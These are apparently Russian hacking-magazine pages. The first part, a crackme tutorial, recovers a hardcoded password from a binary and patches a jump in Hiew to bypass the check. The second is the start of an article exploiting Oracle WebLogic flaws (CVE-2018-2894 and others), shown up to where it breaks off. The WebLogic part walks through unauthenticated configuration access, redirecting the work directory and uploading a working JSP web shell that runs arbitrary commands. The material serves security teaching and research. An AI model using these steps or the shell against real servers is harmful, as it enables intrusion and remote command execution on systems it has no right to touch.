} else {/* Пароль ОK*/}

Давайте дополним этот код процедурами зап роса пароля и вывода резуль‐
татов сравнения, а затем испытаем полученную программу на прочность, то
есть на стойкость к взло му:


Листинг 1. Пример простейшей системы аутен тификации
#include "stdafx.h"
// Простейшая система аутентификации —
// посимвольное сравнение пароля
#include <stdio.h>
#include <string.h>
#define PASSWORD_SIZE 100
#define PASSWORD "myGOODpassword\n"
// Этот перенос нужен затем, чтобы
// не выкусывать перенос из строки,
// введенной пользователем
int main()
{
    // Счетчик неудачных попыток аутентификации
    int count=0;
    // Буфер для пароля, введенного пользователем
    char buff[PASSWORD_SIZE];
    // Главный цикл аутентификации
    for(;;)
    {
        // Запрашиваем и считываем пользовательский
        // пароль
        printf("Enter password:");
        fgets(&buff[0],PASSWORD_SIZE,stdin);
        // Сравниваем оригинальный и введенный пароль
        if (strcmp(&buff[0],PASSWORD))
        // Если пароли не совпадают — «ругаемся»
        printf("Wrong password\n");
        // Иначе (если пароли идентичны)
        // выходим из цикла аутентификации
        else break;
        // Увеличиваем счетчик неудачных попыток
        // аутентификации и, если все попытки
        // исчерпаны, завершаем программу
        if (++count>3) return ‐1;
    }
    // Раз мы здесь, то пользователь ввел правильный
    // пароль
    printf("Password OK\n");
}

В популярных кинофиль мах крутые хакеры легко проникают в любые жутко
защищенные системы, каким‐то непос тижимым образом угадывая искомый
пароль с нескольких попыток. Почему бы не попробовать пойти их путем?
  Не так уж редко пароли представляют собой осмысленные слова наподо‐
бие Ferrari, QWERTY, имена любимых хомячков или наз вания географичес ких
пунктов. Угадывание пароля сродни гаданию на кофейной гуще — никаких
гарантий на успех нет, остается рас считывать на одно лишь везение. А удача,
как известно, птица гордая — палец в рот ей не клади. Нет ли более надеж‐
ного способа взлома?
  Давайте подумаем. Раз эталонный пароль хранит ся в теле программы, то,
если он не зашифрован каким‐нибудь хитрым образом, его можно обна‐
ружить тривиальным просмотром двоично го кода программы. Перебирая все
встретившиеся в ней тексто вые строки, начиная с тех, что более все го сма‐
хивают на пароль, мы очень быстро подберем нужный ключ и откроем им
программу! Причем область просмотра можно существенно  сузить —
в подавляющем большинс тве случаев компиляторы размещают все ини‐
циализированные переменные в сегменте данных (в PE‐файлах он раз меща‐
ется в секции .data или .rdata). Исключение составляют, пожалуй, ранние баг‐
дадские (Borland’овые) компиляторы с их мани акаль ной любовью всовывать
текстовые строки в сегмент кода — непосредственно по месту их вызова.
Это упрощает сам компилятор, но порождает множес тво проблем. Сов‐
ременные операционные системы, в отличие от старушки MS‐DOS, запреща‐
ют модификацию кодового сегмента, и все размещенные в нем переменные
доступны лишь для чтения. К тому же на процессорах с раздельной системой
кеширования они «засоряют» кодовый кеш, попадая туда при упреждающем
чтении, но при первом же обращении к ним вновь загружаются из медленной
оперативной памяти (кеша второго уровня) в кеш данных. В результате —
тормоза и падение производитель ности.
   Что ж, пусть это будет секция данных! Оста ется только найти удобный инс‐
трумент для просмотра двоично го файла. Можно, конечно, нажать клавишу
F3 в своей любимой обо лочке (FAR, например) и, придавив кирпичом кла‐
вишу Page Down, любовать ся бегущими цифирь ками до тех пор, пока
не надоест.
  Можно воспользоваться любым hex‐редактором (QView, Hiew...) — кому
какой по вкусу, — но в статье, по сооб ражениям наглядности, приведен
результат работы утилиты DUMPBIN из штатной поставки Microsoft Visual Stu‐
dio. DUMPBIN запускается из Developer Command Prompt.
   Натравим утилиту на исполняемый файл нашей программы, в котором
лежит пароль, и попросим ее рас печатать содержащую инициализированные
только для чтения данные секцию rdata (ключ /SECTION:.rdata) в «сыром»
виде (ключ /RAWDATA:BYTES), указав значок > для перенаправления вывода
в файл (ответ программы занимает мно го места, и на экране помещается
один лишь «хвост»).


Листинг 2
> dumpbin /RAWDATA:BYTES /SECTION:.rdata passCompare1.exe > rdata.txt
004020E0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
004020F0: 18 30 40 00 68 30 40 00 45 6E 74 65 72 20 70 61  .0@.h0@.Enter pa
00402100: 73 73 77 6F 72 64 3A 00 6D 79 47 4F 4F 44 70 61  ssword:.myGOODpa
00402110: 73 73 77 6F 72 64 0A 00 57 72 6F 6E 67 20 70 61  ssword..Wrong pa
00402120: 73 73 77 6F 72 64 0A 00 50 61 73 73 77 6F 72 64  ssword..Password
00402130: 20 4F 4B 0A 00 00 00 00 00 00 00 00 00 00 00 00   OK.............
00402140: 00 00 00 00 90 0A C1 5B 00 00 00 00 02 00 00 00  ......A[........
00402150: 48 00 00 00 24 22 00 00 24 14 00 00 00 00 00 00  H...$"..$.......

Среди всего прочего тут есть одна строка, до боли похожая на эталонный
пароль (в тексте она выделена жирным шрифтом). Испытаем ее? Впрочем,
какой смысл — судя по исходному тексту программы, это действительно
искомый пароль, открывающий защиту, словно золотой ключик. Слишком уж
видное место выбрал компилятор для его хра нения — пароль не мешало бы
запрятать и получ ше.
  Один из способов сделать это — насильно поместить эталонный пароль
в собственноручно выбранную нами секцию. Такая возможность не предус‐
мотрена стандартом, и потому каждый разработ чик компилятора (строго
говоря, не компилятора, а линкера, но это не суть важно) волен реализовы‐
вать ее по‐своему или не реализовы вать вообще. В Microsoft Visual C++
для этой цели предусмотрена специальная праг ма data_seg, указывающая,
в какую секцию помещать следующие за ней ини циализированные перемен‐
ные. Неинициализированные переменные по умол чанию располагаются
в секции .bss и управляются прагмой bss_seg соответственно.
  В листинг 1 перед функцией main добавим новую секцию, в которой будем
хранить наш пароль:


// С этого момента все инициализированные переменные будут
// размещаться в секции .kpnc
#pragma data_seg(".kpnc")
#define PASSWORD_SIZE 100
#define PASSWORD "myGOODpassword\n"
char passwd[] = PASSWORD;
#pragma data_seg()

Внутри функции main проинициализиру ем мас сив:


// Теперь все инициализированные переменные вновь будут
// размещаться в секции по умолчанию, то есть .rdata
char buff[PASSWORD_SIZE]="";

Немного изменилось условие сравнения строк в цикле:


if (strcmp(&buff[0],&passwd[0]))

Натравим утилиту DUMPBIN на новый исполня емый файл:


> dumpbin /RAWDATA:BYTES /SECTION:.rdata passCompare2.exe > rdata.txt
004020C0: D3 17 40 00 00 00 00 00 D8 11 40 00 00 00 00 00  O.@.....O.@.....
004020D0: 00 00 00 00 2C 11 40 00 D0 11 40 00 00 00 00 00  ....,.@.?.@.....
004020E0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
004020F0: 18 30 40 00 68 30 40 00 45 6E 74 65 72 20 70 61  .0@.h0@.Enter pa
00402100: 73 73 77 6F 72 64 3A 00 57 72 6F 6E 67 20 70 61  ssword:.Wrong pa
00402110: 73 73 77 6F 72 64 0A 00 50 61 73 73 77 6F 72 64  ssword..Password
00402120: 20 4F 4B 0A 00 00 00 00 00 00 00 00 00 00 00 00   OK.............
00402130: 00 00 00 00 6F CB C4 5B 00 00 00 00 02 00 00 00  ....oEA[........
00402140: 48 00 00 00 14 22 00 00 14 14 00 00 00 00 00 00  H...."..........
00402150: 6F CB C4 5B 00 00 00 00 0C 00 00 00 14 00 00 00  oEA[............

Ага, теперь в секции данных пароля нет и хакеры «отды хают»! Но не спе шите
с выводами. Давайте сначала выведем на экран список всех секций, име‐
ющихся в файле:


> dumpbin passCompare2.exe
Summary
    1000 .data
    1000 .kpnc
    1000 .rdata
    1000 .reloc
    1000 .rsrc
    1000 .text

Нестандартная секция .kpnc сразу же приковывает к себе внимание. А ну‐ка
посмотрим, что там в ней?


> dumpbin /SECTION:.kpnc /RAWDATA passCompare2.exe
RAW DATA #4
    00404000: 6D 79 47 4F 4F 44 70 61 73 73 77 6F 72 64 0A 00  myGOODpassword..

Вот  он,  пароль! Спря тали, называется… Можно,  конечно, извратиться
и засунуть секретные данные в секцию неинициализированных данных (.bss)
или даже секцию кода (.text) — не все там догадаются поискать, а работос‐
пособность программы такое раз мещение не нарушит. Но не стоит забывать
о возможности автоматизиро ванного поиска текстовых строк в двоичном
файле. В какой бы секции ни содержался эталонный пароль, фильтр без тру‐
да его найдет (единственная проблема — определить, какая из множества
текстовых строк представляет собой искомый ключ; возможно, потребу ется
перебрать с десяток‐дру гой потенциальных «кандидатов»).


ШАГ ВТОРОЙ. ЗНАКОМСТВО С ДИЗАССЕМБЛЕРОМ
О’кей, пароль мы узнали. Но как же уто мительно вводить его каждый раз
с клавиатуры перед запус ком программы! Хорошо бы ее хакнуть так, чтобы
никакой пароль вооб ще не зап рашивался или любой вве денный пароль прог‐
рамма воспринимала бы как правиль ный.
   Хакнуть, говорите? Что ж, это несложно! Куда проблематичнее опре‐
делиться, чем именно ее хакать. Инс трументарий хакеров чрезвычайно раз‐
нообразен, чего тут только нет: и дизассемблеры, и отладчики, и API‐, и mes‐
sage‐шпионы, и мониторы обращений к файлам (портам, реестру), и рас‐
паковщики исполняемых файлов, и… Сложновато начинающему кодокопате‐
лю со всем этим хозяйством разобрать ся!
  Впрочем, шпионы, мониторы, рас паковщики — второстепенные утилиты
заднего плана, а основное ору жие взломщика — отладчик и дизассемблер.
   Итак, дизассемблер применим для исследова ния откомпилированных
программ и частично пригоден для анализа псевдокомпилированного кода.
Раз   так,  он  дол жен  подойти  для  вскры тия  парольной  защиты
passCompare1.exe. Весь вопрос в том, какой дизассемблер выб рать.
  Не все дизассемблеры одинаковы. Есть среди них и «интеллектуалы»,
автоматически распознающие многие конс трукции, как то: прологи и эпилоги
функций, локальные перемен ные, перекрес тные ссылки, а есть и «простаки»,
чьи способности огра ничены одним лишь перево дом машинных команд
в ассемблерные инструкции.
  Логичнее всего воспользовать ся услугами дизас сембле ра‐интеллектуала
(если он есть), но… давайте не будем спешить, а попробуем выполнить весь
анализ вручную. Тех ника, понят ное дело, штука хорошая, да вот не всегда она
оказывается под рукой, и неп лохо бы заранее научиться работе в полевых
условиях. К тому же общение с пло хим дизассемблером как нельзя лучше
подчеркивает «вкусности» хорошего.
  Воспользуемся уже зна комой нам утилитой DUMPBIN, нас тоящим «швей‐
царским ножиком» со множес твом полезных функций, сре ди которых при‐
таился и дизассемблер. Дизассемблируем секцию кода (как мы помним,
носящую имя .text), перенаправив вывод в файл, так как на экран он, очевид‐
но, не поместится:


> dumpbin /SECTION:.text /DISASM passCompare1.exe > code‐text.txt

Заглянем еще раз в секцию данных (или в дру гую — в зависимости от того,
где хранится пароль): см. лис тинг 2.
  Запомним найденный пароль: myGOODpassword. В отличие от Visual C++
6.0, которой пользовался Крис, Visual C++ 2017 не обращается к ини циали‐
зированным переменным по шестнадцатеричному смещению, а подставляет
значение прямо в секцию кода. Таким обра зом, попробуем най ти выяв‐
ленный ранее пароль в дизас семблированном лис тинге тривиальным кон‐
текстным поиском с помощью любого текстового редактора.


0040107D: B9 08 21 40 00     mov         ecx,offset ??_C@_0BA@
PCMCJPMK@myGOODpassword?6?$AA@
00401082: 8A 10              mov         dl,byte ptr [eax]
00401084: 3A 11              cmp         dl,byte ptr [ecx]
00401086: 75 1A              jne         004010A2
00401088: 84 D2              test        dl,dl
0040108A: 74 12              je          0040109E

Смотрите, центральная часть это го листинга отвечает за сравнение значений
регистров EAX и ECX. В пос ледний, как мы видим, в первой строке листинга
записывается эталонный пароль, следователь но, в первом — введенный
пользователем. Затем происходит сравнение и выполняются переходы почти
в одну и ту же точку: 0x4010A2 и 0x40109E. Заглянем, что там:


0040109E: 33 C0              xor         eax,eax
004010A0: EB 05              jmp         004010A7
004010A2: 1B C0              sbb         eax,eax
004010A4: 83 C8 01           or          eax,1
004010A7: 85 C0              test        eax,eax
004010A9: 74 63              je          0040110E
004010AB: 0F 1F 44 00 00     nop         dword ptr [eax+eax]
004010B0: 68 18 21 40 00     push        offset ??_C@_0BA@EHHIHKNJ@
Wrong?5password?6?$AA@
004010B5: E8 56 FF FF FF     call        _printf

Здесь центральную роль игра ет инс трукция test eax,eax, рас положенная
по смещению 0x4010A7. В случае если eax равен 0, следующая за ней коман‐
да JE совершает прыжок на 0x40110E. В про тивном же случае на вершину сте‐
ка выталкивается строка Wrong password:


push        offset ??_C@_0BA@EHHIHKNJ@Wrong?5password?6?$AA@

а следом — вызов функции с говорящим наз ванием:


call        _printf

Значит, ненулевое значение EAX свидетельствует о ложном пароле, а ноль —
об истинном.
   О’кей, тогда переходим к анализу валидной ветви программы, что дела‐
ется после прыжка на 0x40110E. А  тут при таилась инструкция, которая
помещает строку Password OK на вершину стека, после чего вызывается про‐
цедура _printf, которая, очевидно, выводит строку на экран:


0040110E: 68 28 21 40 00     push        offset ??_C@_0N@MBEFNJID@
Password?5OK?6?$AA@
00401113: E8 F8 FE FF FF     call        _printf

Оперативные сооб ражения следующие: если заменить команду JE на JNE, то
программа отвергнет истинный пароль как неправильный, а любой неп‐
равильный пароль воспримет как истинный. А если заменить TEST EAX,EAX
на XOR EAX,EAX, то пос ле исполнения этой команды регистр EAX будет всег‐
да равен нулю, какой бы пароль ни вводился.
  Дело за малым — найти эти самые байтики в исполняемом файле и слегка
подправить их.


ШАГ ТРЕТИЙ. ХИРУРГИЧЕСКИЙ
Внесение изменений непосредс твенно в исполняемый файл — дело серь‐
езное. Стиснутым уже существу ющим кодом, нам приходится довольство‐
ваться только тем, что есть, и ни раздвинуть команды, ни даже сдвинуть их,
выкинув из защиты «лишние зап части», не получится. Ведь это привело бы
к сдвигу смещений всех остальных команд, тогда как значения указателей
и адресов переходов остались бы без изменений и стали бы указывать сов‐
сем не туда, куда нужно!
   Ну, с «выкидыванием запчастей» справиться как раз таки просто — дос‐
таточно забить код командами NOP (опкод которой 0x90, а вовсе не 0x0,
как почему‐то думают многие начина ющие кодокопатели), то есть пустой опе‐
рацией (вообще‐то NOP — это просто другая форма записи инструкции
XCHG EAX,EAX — если интересно). С «раздвижкой» куда сложнее! К счастью,
в PE‐файлах всегда присутс твует множес тво «дыр», оставшихся от вырав‐
нивания, в них‐то и мож но раз местить свой код или свои данные.
  Но не проще ли просто откомпилировать ассемблированный файл, пред‐
варительно вне ся в него требуемые изменения? Нет, не проще, и вот почему:
если ассемблер не распозна ет ука затели, переда ваемые функции (а как мы
видели, наш дизассемблер не смог отличить их от констант), он, соответс‐
твенно, не позабо тится должным обра зом их скорректировать, и, естествен‐
но, программа работать не будет.
  Приходится резать прог рамму вживую. Лег че всего это делать с помощью
утилиты Hiew, «переваривающей» PE‐формат файлов и упрощающей тем
самым поиск нужного фрагмента. Подойдет любая версия этого hex‐редак‐
тора. Например, я использовал далеко не самую новую версию 6.86, прек‐
расно уживающуюся с Windows 10. Запус тим ее, ука зав имя файла в коман‐
дной строке hiew32 passCompare1.exe, двойным нажатием клавиши Enter,
переключимся в режим ассемблера и при помощи клавиши F5 перейдем
к требуемому адресу. Как мы помним, команда TEST, проверяющая результат
на равенство нулю, располагалась по адресу 0x4010A7.
   Чтобы Hiew мог отличить адрес от смещения в самом фай ле, предварим
его символом точки: .4010A7.


004010A7: 85 C0              test        eax,eax
004010A9: 74 63              je          0040110E

Ага, как раз то, что нам надо! Нажмем клавишу F3 для перевода Hiew в режим
правки, подведем курсор к команде TEST EAX,EAX и, нажав клавишу Enter,
заменим ее на XOR EAX,EAX.


004010A7: 33 C0              xor         eax,eax
004010A9: 74 63              je          0040110E





              Hiew в режиме правки ассемблерной команды

С удовлетворением заметив, что новая команда в аккурат вписалась в пре‐
дыдущую, нажмем клавишу F9 для сохранения изменений на дис ке, а затем
выйдем из Hiew и попробуем запус тить программу, вводя первый при шедший
на ум пароль:


>passCompare1
Enter password:Привет, шляпа!
Password OK

Получилось! Защита пала! Хорошо, а как бы мы дей ствовали, не умей Hiew
«переваривать» PE‐файлы? Тогда пришлось бы прибегнуть к контекстному
поиску. Обратим свой взор на шестнадцатеричный дамп, расположенный
дизассемблером слева от ассемблерных команд. Конечно, если пытаться
найти последовательность 85 C0 — код команды TEST EAX,EAX, ничего
хорошего из этого не выйдет — этих самых TEST’ов в программе может быть
несколько сотен, а то и больше. А вот адрес перехода, скорее все го, во всех
ветках программы различен, и подстрока TEST EAX,EAX/JE 0040110E имеет
хорошие шансы на уникальность. Попробуем найти в файле соответствующий
ей код: 85 C0 74 63 (в Hiew для это го достаточно нажать клавишу F7).
   Опп‐с! Найдено только одно вхождение, что нам, собс твенно, и нужно.
Давайте теперь попробуем модифицировать файл непосредственно в hex‐
режиме, не переходя в ассемблер. Попут но возьмем себе на заметку —
инверсия младшего бита кода команды при водит к изменению условия
перехода на противо полож ное, то есть 74 JE → 75 JNE.





             Hiew в режиме правки шестнадцатеричного кода

Работает? В смысле защита свихнулась окончательно — не признает
истинные пароли, зато радостно приветствует остальные. Замечательно!





           Взло манная программа принимает любые пароли


ПРОДОЛЖЕНИЕ СЛЕДУЕТ?
Итак, ты прочел (прочел ведь?) начальный отрывок классичес кой книги Кри са
Касперски «Фундаментальные основы хакерс тва» в современном пере‐
осмыслении. Получилось ли у нас обновить эти зна ния до актуального уров‐
ня? Стоит ли продол жать? Поделись своим мнением в комментариях.
ВЗЛОМ





                                                                                     aLLy
                                                                                 ONsec
                                                                                             @iamsecurity


ДЫРЯВАЯ
ЛОГИКА
ЭКСПЛУАТИРУЕМ НОВЫЕ
УЯЗВИМОСТИ В ORACLE WEBLOGIC




В этой статье мы поговорим сразу о несколь ких уязвимостях
в  сервере  приложений  Oracle  WebLogic,  написанном
на Java. Этот продукт безумно популярен в энтерпрайз‐сре‐
де и попадается постоян но на периметрах разных компаний
от мала до велика. Уязвимости носят критический характер
и позволяют злоумыш леннику выполнить произвольный код
на целевой сис теме.


Oracle WebLogic — это решение для пос троения сервис‐ориентированной
архитектуры (SOA), создания функциональных пакетов разного уровня свя‐
занности и сложности. Под угрозой оказались все актуальные версии при‐
ложения — 10.3.6.0, 12.1.3.0, 12.2.1.3 и ниже.


УЯЗВИМОСТИ
CVE‐2018‐2894 позволяет заг ружать произвольные файлы в систему, в том
числе исполняемые (типа JSP), которые затем доступны через веб.
   CVE‐2018‐3246 — XXE при заг рузке XML‐фай ла в качес тве тестового сце‐
нария в компоненте Web Services Test Client.
   CVE‐2018‐2628,  CVE‐2018‐3252 —  выполнение  произвольного  кода
при помощи протокола JRMP.
   CVE‐2018‐3191 — выполнение произвольного кода путем десериализации
произвольных объектов Java, переданных через POST‐запрос.


СТЕНД
Я буду поднимать сервер WebLogic версии 12.2.1.3.0 на системе Windows.
Скачиваем инсталлятор с официального сайта Oracle из раздела Downloads.
Для  корректной   установки  и  работы  WebLogic  потребуется  JDK
выше 1.8.0.130.


java.exe ‐jar fmw_12.2.1.3.0_wls_quick.jar

Если хочешь исполь зовать версию ниже, то можешь отключить эту проверку,
добавив ключ ‐ignoreSysPrereqs.





                Установка WebLogic 12.2.1.3.0 в Windows

Теперь нужно создать домен WebLogic. Для этого запус каем конфигуратор
из домашней директории сервера:


oracle_common\common\bin\config.cmd





                   Создание домена в WebLogic

На первом этапе нужно ука зать, куда будут сохранены все возможные конфиги
и прочие причиндалы для новоиспеченного домена. Рекомендую оставить
по дефолту, для теста это абсолютно неважно.
  На втором этапе выбира ем все возможные шаб лоны.





             Выбор шаблонов при создании домена

Затем указываем связку логин‐пароль для админа, режим работы домена —
«разработка» или production. А также можно дополнительно настроить порты
и сетевые устройства, на которых будет висеть сервер. Для этого отмечай
гал кой Administration Server в разделе Advanced Conﬁguration.





       Дополнительные нас тройки при соз дании домена WebLogic

После этого жмем на кнопку Create, откидыва емся на спинку кресла и ждем
создания нового домена. Это быстро, так что далеко откинуться не успеешь.





             Прогресс создания нового домена в WebLogic

Теперь жмем на Next и попадаем на пос леднее окно, где можно отметить
галочкой пункт Start Admin Server для немедленно го запуска того, что мы
наконфигурировали. Жмем на Finish. Если галочкой ты не вос пользовался, то
запустить сервер можно также через командную строку. Для этого заходим
в домашнюю директорию WebLogic и выполняем


user_projects\domains\base_domain\startWebLogic.cmd

Разумеется, путь актуален, если ты не менял дефолтные нас тройки при соз‐
дании домена.





                      Готовый стенд WebLogic

Те, кто не любит сложности, могут использовать Docker и готовый образ с Vul‐
Hub. Готовый стенд поднимается одной командой:


docker run ‐p7001:7001 ‐‐name weblogic ‐‐rm vulhub/weblogic:12.2.1.3

Это версия 12.2.1.3, а если нуж на 10.3.6.0, то выполняй


docker run ‐p7001:7001 ‐‐name weblogic ‐‐rm vulhub/weblogic




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

   ДЫРЯВАЯ ЛОГИКА
              ЭКСПЛУАТИРУЕМ НОВЫЕ УЯЗВИМОСТИ
                           В ORACLE WEBLOGIC





ЗАГРУЗКА ПРОИЗВОЛЬНЫХ ФАЙЛОВ НА СЕРВЕР (CVE-2018-2893,
CVE-2018-2894)
Первая уязвимость присутс твует в компоненте Web Services Test Client.
Он доступен по адресу /ws_utc/. Перейдя на него, ты увидишь окно авториза‐
ции.





              Форма входа в Web Services Test Client

Однако не спеши закрывать окно и расстра иваться, ведь разработчики
забыли кое‐что важное — добавить проверку на валидную сессию в раз дел
конфигурации данного раз дела. И если сервер работает в режиме develop‐
ment, то получить к нему доступ можно, просто перейдя на /ws_utc/conﬁg.do.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/web/Processor.java
40:   public Forward config() {
41:     if (RequestUtil.isProductionMode()) {
42:       this.response.setStatus(503);
43:       return null;
44:     }
45:     String defaultType = this.request.getParameter("default");
46:     if (defaultType == null) {
47:       defaultType = "";
48:     }
49:     this.request.setAttribute("default", defaultType);
50:     return new Forward("setting");
51:   }





  Страница конфигурации Web Services Test Client доступна без авториза‐
  ции

Основные исходники этого компонента ты найдешь в файле


<weblogic_home>/user_projects/domains/base_domain/servers/AdminServer
/tmp/_WL_internal/com.oracle.webservices.wls.ws‐testclient‐app‐wls/4
mcj4y/war/WEB‐INF/lib/ws‐testpage‐impl.jar

Уже можно вооружаться JD‐GUI или воспользовать ся он лай новым деком‐
пилятором, чтобы посмотреть поб лиже на логику работы приложения.
  Надеюсь, ты помнишь про настройку Work Home Dir на странице кон‐
фига? В ней указывается путь, где расположены фай лы, нужные для работы
тестового клиента, причем есть возможность этот путь менять. Пос ле вне‐
сения изменений уже существу ющая структура, включая файлы и папки,
переносится из старой директории в новую.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/setting/TestClient-
WorkDirManager.java
61:   public void changeWorkDir(String path) {
62:     String[] oldPaths = getRelatedPaths();
63:
64:     if (this.testPageProvider.getWsImplType() == ImplType.JRF) {
65:       this.isWorkDirChangeable = false;
66:       this.isWorkDirWritable = isDirWritable(path);
67:       this.isWorkDirChangeable = true;
68:       setTestClientWorkDir(path);
69:     } else {
70:       persistWorkDir(path);
71:       init();
72:     }
73:
74:     if (this.isWorkDirWritable) {
75:       String[] newPaths = getRelatedPaths();
76:       moveDirs(oldPaths, newPaths);

Следующий шаг в нашем списке дел — это найти такую директорию, которая
будет доступна из веба. Отлично подойдет css, она расположе на при мерно
по тому же пути, где валялся jar: <weblogic_home>/user_projects/domains/
base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.web‐
services.wls.ws‐testclient‐app‐wls/4mcj4y/war/css. В  зависимости
от имени сервера будет изменяться часть AdminServer, а в зависимости
от версии WebLogic — часть 4mcj4y. После того как мы сохраним изменения,
вся структура приложения будет доступна из веба. Пока там у нас только один
конфиг general, но это ненадол го.





        Изменили рабочую директорию в Web Services Test Client

Поменяв рабочую директорию, переходим в раз дел Security. Там име ется
возможность загружать файлы клю чевых хра нилищ (keystore).





         Раздел Security нас троек тес тового клиента Web Services

Жми на кнопку Add, выбирай любой файл, а дальше Submit.





             Добавление нового ключевого хранилища

При загрузке файла запрос улетает на /ws_utc/resources/setting/key‐
store?timestamp=1540385552610, где параметр timestamp отвечает за вре‐
мя отправки POST‐запроса. Логика обра ботки формы типа multipart/form‐
data расположена в файле RSDataHelper.java.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/ws/res/SettingRe-
source.java
186:   @Path("/keystore")
187:   @POST
188:   @Produces({"application/xml", "application/json"})
189:   @Consumes({"multipart/form‐data"})
190:   public Response editKeyStoreSettingByMultiPart(org.glassfish.
jersey.media.multipart.FormDataMultiPart formPartParams) {
...
200:     String currentTimeValue = "" + new Date().getTime();
...
203:     KeyValuesMap<String, String> formParams = RSDataHelper.
getInstance().convertFormDataMultiPart(formPartParams, true, TestCl
ientRT.getKeyStorePath(), currentTimeValue);

Все файлы сохраняются в пап ку keystore.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/core/ws/cdf/config/pa
rameter/TestClientRT.java
29:   public static String getKeyStorePath() {
30:     return getConfigDir() + File.separator + "keystore";
31:   }

А в качестве префикса используется текущая дата в формате времени Unix.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/ws/util/RSData-
Helper.java
098:   public KeyValuesMap<String, String> convertFormDataMultiPart(
FormDataMultiPart formPartParams, boolean isExtactAttachment, String
path)
099:   {
100:     return convertFormDataMultiPart(formPartParams, isExta
ctAttachment, path, null);
101:   }
102:
103:   public KeyValuesMap<String, String> convertFormDataMultiPart(
FormDataMultiPart formPartParams, boolean isExtactAttachment, String
path, String fileNamePrefix)
104:   {
...
109:     KeyValuesMap<String, String> kvMap = new KeyValuesMapImpl();
110:
111:     Map<String, List<FormDataBodyPart>> fieldMap = formPa
rtParams.getFields();
112:     Set<String> keySet = fieldMap.keySet();
...
122:         String attachName = fdcd.getFileName();
...
131:             if (fileNamePrefix == null) {
132:               fileNamePrefix = key;
133:             }
134:             String filename = new File(storePath, fileNamePrefix
 + "_" + attachName).getAbsolutePath();
135:             kvMap.addValue(key, filename);
136:
137:             if (isExtactAttachment) {
138:               saveAttachedFile(filename, (InputStream)bodyPart.
getValueAs(InputStream.class));
139:             }

Поэтому наш файл после заг рузки будет доступен по адре су


http://weblogic.vh:7001/ws_utc/css/config/keystore/1540385552726_t
est.txt





                 Загруженный файл доступен через веб

Обрати  внимание,  что  префикс файла  не  совпадает  с  параметром
timestamp, который мы передавали в запросе. Чтобы узнать нужный, можно
перейти по адре су http://weblogic.vh:7001/ws_utc/resources/setting/
keystore, и там в поле id будет то, что мы ищем.





           Список заг руженных файлов ключевых хранилищ

Теперь дело за малым. Прос то загружаем в качестве ключевого хранилища
JSP‐шелл. Такой, например.


<%@ page import="java.util.*,java.io.*,java.net.*"%>
<html><body>
<form method="POST" action="">
<input type="text" name="cmd">
<input type="submit" value="send command">
</form>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "\n<br>")
;
    Process p = Runtime.getRuntime().exec("cmd /c " + request.getPar
ameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); disr = dis.readLine(); }
    }
%>
</pre>
</body></html>





                Загрузка шелла в WebLogic через keystore

Как ты помнишь, мы изменяли рабочую директорию на монструозный путь,
который зависит от названия сервера, его вер сии и прочего. На самом деле
есть и другие пути, по которым можно разместить нашу папку. Например,


<домашняя_директория_weblogic>/wlserver/server/lib/consoleapp/webapp/
framework/skins/wlsconsole/images/

В  таком  случае  все  загруженные  фай лы  будут  доступны  по  URI
/console/framework/skins/wlsconsole/images/conﬁg/keystore/.





      Залив ка шелла с исполь зованием другой рабочей директории

Если тебя интересует автоматизация экс плуатации, то можно воспользовать‐
ся поиском по GitHub. Там такого доб ра навалом.
  С этим делом разоб рались, но есть еще одна возможность залить шелл
в систему. Тут требуется авторизация, но быстренько пробежимся и по этому
методу.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/web/Processor.java
82:   public Forward begin() {
83:     if (this.request.getUserPrincipal() != null) {
84:       this.request.setAttribute("show_log_out", "true");
85:     } else {
86:       this.request.setAttribute("show_log_out", "false");
87:     }
88:     if (RequestUtil.isRequstedByAdmin(this.request)) {
89:       this.request.setAttribute("show_setting", "true");
90:     } else {
91:       this.request.setAttribute("show_setting", "false");
92:     }

Авторизуемся админом  в Web  Services  Test  Client, по дефол ту логин
weblogic. Попадаем на стра ницу begin.do.





                Главная стра ница Web Services Test Client

Теперь включай свой любимый прокси‐сниффер и жми на кнопку Import test
case. Откроется окно выбора файла для загрузки, выбираем там наш шелл
и кликаем на Import.





          Загрузка тес товых сценариев в Web Services Test Client

За загрузку файла отвечает все тот же RSDataHelper.java.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/ws/util/RSData-
Helper.java
49:   public KeyValuesMap<String, String> convertFormDataMultiPart(
FormDataMultiPart formPartParams, boolean isExtactAttachment)
50:   {
51:     File pathFile = new File(com.oracle.webservices.testclient.
core.ws.cdf.config.parameter.TestClientRT.getUploadDir());
52:     if (!pathFile.exists()) {
53:       pathFile.mkdirs();
54:     }
55:
56:     cleanObsoleteFile(pathFile);
57:
58:     String dirName = "RS_Upload_" + df.format(new Date());
59:     String uploadPath = new File(pathFile, dirName).getAbs
olutePath();
60:
61:     return convertFormDataMultiPart(formPartParams, isExta
ctAttachment, uploadPath);
62:   }

По дефолту директория, в которую скидыва ются файлы, имеет префикс RS_U‐
pload_, также в названии используется текущая дата.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/ws/action/ImportTest-
CaseAction.java
41:   public ActionData execute(ActionData actionData)
42:   {
43:     KeyValuesMap<String, String> formParams = (KeyValuesMap)
actionData.get("request_form_data");
44:     try {
45:       String fileName = (String)formParams.getFirstValue("import
_file_name");
46:       String importId = "" + new Date().getTime();





           Загрузка шелла в WebLogic через тес товые сце нарии

В ответе сервер вернет ошибку, в которой мы можем видеть полный путь
до файла. Она возникает из‐за того, что WebLogic пытается выполнить
демаршаллинг содержимого загруженного документа.


ws-testpage-
impl.jar.src/com/oracle/webservices/testclient/ws/action/ImportTest-
CaseAction.java
53:       TTestConfig tconfig = (TTestConfig)Unmarshaller.unmarshal(
new File(fileName));

